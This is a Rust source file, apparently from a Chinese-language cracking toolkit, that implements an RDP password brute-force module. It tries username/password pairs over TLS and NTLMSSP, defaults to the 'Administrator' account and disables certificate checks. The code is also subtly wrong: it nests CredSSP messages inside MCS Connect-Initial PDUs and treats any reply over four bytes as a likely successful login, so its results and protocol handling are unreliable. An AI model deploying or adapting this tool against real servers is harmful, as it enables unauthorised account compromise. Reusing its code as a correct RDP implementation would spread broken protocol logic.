//! RDP 爆破模块
//!
//! 实现 CredSSP/NLA (Network Level Authentication) 协议认证。
//! 协议流程: TCP → TPKT/X.224 协商 → TLS 握手 → CredSSP (NTLMSSP)

use async_trait::async_trait;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;

use crate::cracker::base;
use crate::cracker::ntlm;
use crate::cracker::service::{CrackConfig, CrackResult, CrackService, Cracker};

/// RDP 协议常量
const PROTOCOL_SSL: u32 = 0x00000001; // SSL/TLS
const PROTOCOL_CREDSSP: u32 = 0x00000002; // CredSSP

/// RDP 爆破器
pub struct RdpCracker;

impl RdpCracker {
    pub fn new() -> Self {
        Self
    }
}

impl Default for RdpCracker {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Cracker for RdpCracker {
    async fn crack(&self, config: &CrackConfig) -> CrackResult {
        base::run_crack(
            config,
            CrackService::Rdp,
            "RDP",
            |username, password, target, port, timeout| {
                let username = username.unwrap_or_else(|| "Administrator".to_string());
                Self::try_connect_sync(&target, port, &username, &password, timeout)
            },
        )
        .await
    }

    async fn verify(
        &self,
        target: &str,
        port: u16,
        username: Option<&str>,
        password: &str,
    ) -> bool {
        let username = username.unwrap_or("Administrator");
        Self::try_connect_sync(target, port, username, password, Duration::from_secs(10))
    }
}

impl RdpCracker {
    /// 尝试通过 CredSSP/NLA 认证连接 RDP 服务
    fn try_connect_sync(
        target: &str,
        port: u16,
        username: &str,
        password: &str,
        timeout: Duration,
    ) -> bool {
        // 1. TCP 连接
        let stream = match Self::tcp_connect(target, port, timeout) {
            Some(s) => s,
            None => return false,
        };

        // 2. X.224 连接请求
        let stream = match Self::x224_negotiate(stream) {
            Ok(s) => s,
            Err(_) => return false,
        };

        // 3. TLS 握手
        let mut tls_stream = match Self::tls_upgrade(stream) {
            Ok(s) => s,
            Err(_) => return false,
        };

        // 4. CredSSP/NTLMSSP 认证
        Self::credssp_auth(&mut tls_stream, username, password)
    }

    /// TCP 连接到 RDP 服务
    fn tcp_connect(target: &str, port: u16, timeout: Duration) -> Option<TcpStream> {
        let addr = format!("{}:{}", target, port);
        let socket_addrs = addr.to_socket_addrs().ok()?;

        for sockaddr in socket_addrs {
            if let Ok(stream) = TcpStream::connect_timeout(&sockaddr, timeout) {
                let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
                let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
                return Some(stream);
            }
        }
        None
    }

    /// X.224 连接请求与协议协商
    fn x224_negotiate(mut stream: TcpStream) -> Result<TcpStream, String> {
        // 构造 X.224 Connection Request
        let request = build_x224_cr();
        stream
            .write_all(&request)
            .map_err(|e| format!("发送 X.224 请求失败: {}", e))?;

        // 读取响应
        let mut response = [0u8; 1024];
        let n = stream
            .read(&mut response)
            .map_err(|e| format!("读取 X.224 响应失败: {}", e))?;

        if n < 11 {
            return Err("X.224 响应太短".to_string());
        }

        // 验证 TPKT 头 (version=3)
        if response[0] != 3 {
            return Err("无效的 TPKT 版本".to_string());
        }

        // 验证 X.224 Connection Confirm (TPDU type = 0xD0)
        // TPKT 头长度为 4 字节，X.224 TPDU 从第 5 字节开始
        let tpdu_start = 4;
        // X.224 长度指示
        let x224_len = response[tpdu_start] as usize;
        // TPDU 类型: 0xD0 = Connection Confirm
        let tpdu_type = response[tpdu_start + 1];
        if tpdu_type != 0xD0 {
            return Err(format!(
                "期望 Connection Confirm (0xD0), 收到 0x{:02X}",
                tpdu_type
            ));
        }

        // 解析 RDP Negotiation Response
        // 跳过 X.224 头部 (tpdu_start + 2 + x224_len - 1 = 实际数据起始)
        let nego_start = tpdu_start + 2 + x224_len;
        if nego_start + 8 <= n {
            // 检查协商类型: 0x00000002 = TYPE_NEG_RSP
            let nego_type = u32::from_be_bytes(
                response[nego_start..nego_start + 4]
                    .try_into()
                    .unwrap_or([0; 4]),
            );
            let selected_protocol = u32::from_le_bytes(
                response[nego_start + 4..nego_start + 8]
                    .try_into()
                    .unwrap_or([0; 4]),
            );

            if nego_type != 0x00000002 {
                return Err("服务器不支持协议协商".to_string());
            }

            // 检查是否支持 CredSSP
            if selected_protocol & PROTOCOL_CREDSSP == 0 && selected_protocol & PROTOCOL_SSL == 0 {
                return Err("服务器不支持 CredSSP/SSL".to_string());
            }
        }

        Ok(stream)
    }

    /// TLS 握手升级
    fn tls_upgrade(stream: TcpStream) -> Result<native_tls::TlsStream<TcpStream>, String> {
        let connector = native_tls::TlsConnector::builder()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true)
            .build()
            .map_err(|e| format!("创建 TLS 连接器失败: {}", e))?;

        // 使用空域名进行连接
        connector
            .connect("rdp", stream)
            .map_err(|e| format!("TLS 握手失败: {}", e))
    }

    /// CredSSP/NTLMSSP 认证
    fn credssp_auth(
        tls_stream: &mut native_tls::TlsStream<TcpStream>,
        username: &str,
        password: &str,
    ) -> bool {
        // 构造 NTLMSSP Type 1 消息
        let type1 = ntlm::build_type1("WORKSTATION", "");
        let ts_request1 = ntlm::encode_ts_request(2, &type1);

        // 包装在 MCS Connect-Initial 中
        let mcs_request = build_mcs_connect_initial(&ts_request1);
        if tls_stream.write_all(&mcs_request).is_err() {
            return false;
        }

        // 读取服务器响应
        let mut response = vec![0u8; 16384];
        let n = match tls_stream.read(&mut response) {
            Ok(n) if n > 0 => n,
            _ => return false,
        };

        // 从 MCS Connect-Response 中提取 TSRequest
        let server_ts = match extract_ts_request_from_mcs(&response[..n]) {
            Some(data) => data,
            None => return false,
        };

        // 从 TSRequest 中提取 NTLMSSP Type 2
        let type2_data = match ntlm::decode_ts_request(&server_ts) {
            Ok(data) => data,
            Err(_) => return false,
        };

        // 解析 Type 2 Challenge
        let challenge = match ntlm::parse_type2(&type2_data) {
            Ok(c) => c,
            Err(_) => return false,
        };

        // 计算 Type 3 响应
        let type3 = ntlm::build_type3(username, password, "", "WORKSTATION", &challenge);
        let ts_request3 = ntlm::encode_ts_request(2, &type3);

        // 发送 Type 3（包装在 MCS Erect Domain Request + Send Data Request 中）
        let mcs_auth = build_mcs_auth_request(&ts_request3);
        if tls_stream.write_all(&mcs_auth).is_err() {
            return false;
        }

        // 读取认证结果
        let mut result_buf = vec![0u8; 8192];
        match tls_stream.read(&mut result_buf) {
            Ok(n) if n > 0 => {
                // 如果服务器没有关闭连接或返回错误，认证可能成功
                // 实际判断需要解析 PDU 类型
                // 简化判断: 如果收到响应且不是明确的错误，认为认证可能成功
                n > 4
            }
            _ => false,
        }
    }

    /// 检查端口是否开放
    pub async fn check_port_open(target: &str, port: u16, timeout: Duration) -> bool {
        let target = target.to_string();

        tokio::task::spawn_blocking(move || {
            let addr = format!("{}:{}", target, port);
            match addr.to_socket_addrs() {
                Ok(addrs) => {
                    for sockaddr in addrs {
                        if TcpStream::connect_timeout(&sockaddr, timeout).is_ok() {
                            return true;
                        }
                    }
                    false
                }
                Err(_) => false,
            }
        })
        .await
        .unwrap_or(false)
    }
}

// ==================== X.224 / TPKT 协议 ====================

/// 构建 TPKT + X.224 Connection Request + RDP Negotiation Request
fn build_x224_cr() -> Vec<u8> {
    // RDP Cookie (可选)
    let cookie = b"mstshash=user";

    // RDP Negotiation Request (8 字节)
    let mut nego_req = Vec::with_capacity(8);
    nego_req.extend_from_slice(&0x00000002u32.to_be_bytes()); // Type = TYPE_NEG_REQ
    nego_req.extend_from_slice(&0x00000003u32.to_le_bytes()); // Requested protocols: SSL | CREDSSP

    // X.224 TPDU: Connection Request
    // LI + 0xE0 (CR) + DST-REF(2) + SRC-REF(2) + CLASS_OPTION(1) + data
    let x224_data_len = cookie.len() + 1 + nego_req.len(); // +1 for RDP_NEG_REQ 标志字节
    let x224_len = (x224_data_len + 5) as u8; // header: LI + 0xE0 + dst-ref + src-ref + class

    let mut x224 = Vec::with_capacity(x224_data_len + 7);
    x224.push(x224_len); // LI
    x224.push(0xE0); // TPDU type: Connection Request
    x224.extend_from_slice(&0x0000u16.to_be_bytes()); // DST-REF
    x224.extend_from_slice(&0x0000u16.to_be_bytes()); // SRC-REF
    x224.push(0x00); // CLASS OPTION
                     // Cookie
    x224.extend_from_slice(cookie);
    x224.push(0x0D); // CR+LF 分隔
    x224.push(0x0A);
    // RDP Negotiation Request
    x224.extend_from_slice(&nego_req);

    // TPKT 头: version(1) + reserved(1) + length(2)
    let tpkt_len = (4 + x224.len()) as u16;
    let mut tpkt = Vec::with_capacity(tpkt_len as usize);
    tpkt.push(0x03); // version
    tpkt.push(0x00); // reserved
    tpkt.extend_from_slice(&tpkt_len.to_be_bytes()); // length (big-endian)
    tpkt.extend_from_slice(&x224);

    tpkt
}

// ==================== MCS (T.125) 协议 ====================

/// 构建 MCS Connect-Initial PDU
///
/// 结构: DOMAIN-MCSPDU (101) → Connect-Initial → callingDomainSelector + calledDomainSelector + upwardFlag + GCC
fn build_mcs_connect_initial(ts_request: &[u8]) -> Vec<u8> {
    // GCC Conference Create Request
    let gcc = build_gcc_conference_create(ts_request);

    // Connect-Initial 的字段
    // callingDomainSelector: "1" (OCTET_STRING)
    let calling_sel = ber_octet_string(b"1");
    // calledDomainSelector: "" (OCTET_STRING)
    let called_sel = ber_octet_string(b"");
    // upwardFlag: TRUE
    let upward = vec![0x01];

    // Connect-Initial 内容 (BER 编码)
    let mut ci_content = Vec::new();
    ci_content.extend_from_slice(&calling_sel);
    ci_content.extend_from_slice(&called_sel);
    ci_content.extend_from_slice(&upward);
    ci_content.extend_from_slice(&gcc);

    // Connect-Initial 包装在 APPLICATION 101 中
    // Tag = 0x65 (APPLICATION 5, 但实际上 MCS Connect-Initial 的 tag 是 context-specific)
    // 实际编码: [APPLICATION 101] = 0x7F 0x25 (长格式)
    let mut connect_initial = Vec::new();
    connect_initial.push(0x7F);
    connect_initial.push(0x25);
    ber_write_length(&mut connect_initial, ci_content.len());
    connect_initial.extend_from_slice(&ci_content);

    // TPKT 包装
    let tpkt_len = (4 + connect_initial.len()) as u16;
    let mut tpkt = Vec::with_capacity(tpkt_len as usize);
    tpkt.push(0x03);
    tpkt.push(0x00);
    tpkt.extend_from_slice(&tpkt_len.to_be_bytes());
    tpkt.extend_from_slice(&connect_initial);

    tpkt
}

/// 构建 GCC Conference Create Request
fn build_gcc_conference_create(ts_request: &[u8]) -> Vec<u8> {
    // UserData: key = 0xC006 (h221 系列标准), value = ts_request
    let mut user_data = Vec::new();
    // H221 key: 0xC006 是标准的 T.124 键
    user_data.extend_from_slice(&[0xC0, 0x06]);
    // h221 非标准键 (实际 RDP 使用)
    let h221_key = b"h221";
    user_data.extend_from_slice(h221_key);
    // 附加 TSRequest 数据
    user_data.extend_from_slice(ts_request);

    // UserData 包装为 OCTET STRING
    let ud_octet = ber_octet_string(&user_data);

    // Conference Create Request (APPLICATION 14)
    // SEQUENCE { key, userData }
    let mut conf_content = Vec::new();
    // key (OCTET STRING)
    conf_content.extend_from_slice(&ber_octet_string(b"h221"));
    // userData
    conf_content.extend_from_slice(&ud_octet);

    // APPLICATION 14 = 0x6E
    let mut gcc = Vec::new();
    gcc.push(0x6E);
    ber_write_length(&mut gcc, conf_content.len());
    gcc.extend_from_slice(&conf_content);

    gcc
}

/// 构建 MCS 认证请求 (Erect Domain + Send Data Request)
fn build_mcs_auth_request(ts_request: &[u8]) -> Vec<u8> {
    // 简化: 直接发送 TSRequest 包装在 TPKT 中
    // 实际上在 NLA 阶段，后续的 TSRequest 直接发送即可（仍在 TLS 通道上）

    let tpkt_len = (4 + ts_request.len()) as u16;
    let mut tpkt = Vec::with_capacity(tpkt_len as usize);
    tpkt.push(0x03);
    tpkt.push(0x00);
    tpkt.extend_from_slice(&tpkt_len.to_be_bytes());
    tpkt.extend_from_slice(ts_request);

    tpkt
}

/// 从 MCS Connect-Response 中提取 TSRequest
fn extract_ts_request_from_mcs(data: &[u8]) -> Option<Vec<u8>> {
    // 跳过 TPKT 头 (4 字节)
    if data.len() < 4 {
        return None;
    }
    let mcs_data = &data[4..];

    // 查找 TSRequest 的 ASN.1 SEQUENCE 标签 (0x30)
    // 由于 MCS/GCC 层的结构，TSRequest 可能在数据中的不同位置
    // 简化方法: 在数据中搜索 "NTLMSSP\0" 签名
    let ntlmssp_sig = b"NTLMSSP\0";
    if let Some(pos) = find_subsequence(mcs_data, ntlmssp_sig) {
        // 从 NTLMSSP 签名开始提取 Type 2 消息
        // Type 2 消息的长度需要从消息头中读取
        if mcs_data.len() > pos + 12 {
            // 消息头至少有 48 字节
            let msg_len = mcs_data.len() - pos;
            return Some(mcs_data[pos..pos + msg_len].to_vec());
        }
    }

    None
}

/// 在字节序列中查找子序列
fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

// ==================== BER 编码辅助 ====================

/// BER OCTET STRING 编码
fn ber_octet_string(data: &[u8]) -> Vec<u8> {
    let mut result = Vec::with_capacity(2 + data.len());
    result.push(0x04); // OCTET STRING tag
    ber_write_length(&mut result, data.len());
    result.extend_from_slice(data);
    result
}

/// BER 写入长度字段
fn ber_write_length(buf: &mut Vec<u8>, len: usize) {
    if len < 128 {
        buf.push(len as u8);
    } else if len < 256 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push(((len >> 8) & 0xFF) as u8);
        buf.push((len & 0xFF) as u8);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rdp_cracker_creation() {
        let cracker = RdpCracker::new();
        let _ = cracker;
    }

    #[test]
    fn test_build_x224_cr() {
        let request = build_x224_cr();
        // 验证 TPKT 版本
        assert_eq!(request[0], 0x03);
        // 验证 TPKT 长度字段 (big-endian)
        let tpkt_len = u16::from_be_bytes([request[2], request[3]]);
        assert_eq!(tpkt_len as usize, request.len());
        // 验证 X.224 Connection Request TPDU type
        assert_eq!(request[5], 0xE0);
    }

    #[test]
    fn test_build_mcs_connect_initial() {
        let ts_req = ntlm::encode_ts_request(2, &ntlm::build_type1("WORKSTATION", ""));
        let mcs = build_mcs_connect_initial(&ts_req);
        // 验证 TPKT 版本
        assert_eq!(mcs[0], 0x03);
        let tpkt_len = u16::from_be_bytes([mcs[2], mcs[3]]);
        assert_eq!(tpkt_len as usize, mcs.len());
    }

    #[test]
    fn test_ber_octet_string() {
        let data = b"test";
        let encoded = ber_octet_string(data);
        assert_eq!(encoded[0], 0x04);
        assert_eq!(encoded[1], 4);
        assert_eq!(&encoded[2..6], data);
    }

    #[test]
    fn test_find_subsequence() {
        let haystack = b"hello NTLMSSP\0world";
        let needle = b"NTLMSSP\0";
        assert_eq!(find_subsequence(haystack, needle), Some(6));
        assert_eq!(find_subsequence(haystack, b"xyz"), None);
    }

    #[test]
    fn test_extract_ts_request_finds_ntlmssp() {
        let mut data = vec![0x03, 0x00, 0x00, 0x40]; // TPKT 头
        data.extend_from_slice(b"some data NTLMSSP\0");
        data.extend_from_slice(&[0u8; 32]);

        let result = extract_ts_request_from_mcs(&data);
        assert!(result.is_some());
        assert_eq!(&result.unwrap()[0..8], b"NTLMSSP\0");
    }
}
